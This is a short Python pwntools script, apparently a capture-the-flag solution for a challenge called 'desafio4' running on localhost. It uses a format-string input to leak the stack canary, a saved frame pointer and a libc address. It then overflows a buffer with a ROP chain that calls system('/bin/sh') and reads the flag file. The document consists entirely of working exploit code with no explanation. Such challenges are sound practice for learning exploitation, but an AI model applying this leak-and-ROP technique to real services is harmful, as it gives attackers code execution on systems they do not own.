#!/bin/python3
from pwn import *

context.binary = elf = ELF("./desafio4/desafio")
libc = ELF("./desafio4/libc.so.6")
ld = ELF("./desafio4/ld-linux-x86-64.so.2")

#p = process([ld.path, "--preload", libc.path, elf.path])
p = remote("localhost", 1333)

p.sendline(b"XX%15$llxXX%16$llxXX%17$llxXX")
p.readuntil(b"XX")
canary = int(p.readuntil(b"XX", True), 16)
stkrbp = int(p.readuntil(b"XX", True), 16)
libc.address = int(p.readuntil(b"XX", True), 16) - 0x2a1ca

# Encontrado com ROPgadget
# 0x0000000000129a30 : pop rax ; pop rdi ; call rax
call_gadget = libc.address + 0x129a30
system_addr = libc.symbols["system"]
binsh_str = next(libc.search(b"/bin/sh"))

payload = b"a"*72
payload += p64(canary)
payload += p64(stkrbp)
payload += p64(call_gadget)
payload += p64(system_addr)
payload += p64(binsh_str)

p.sendline(payload)

p.sendline(b"cat flag")
p.sendline(b"exit")

p.stream()
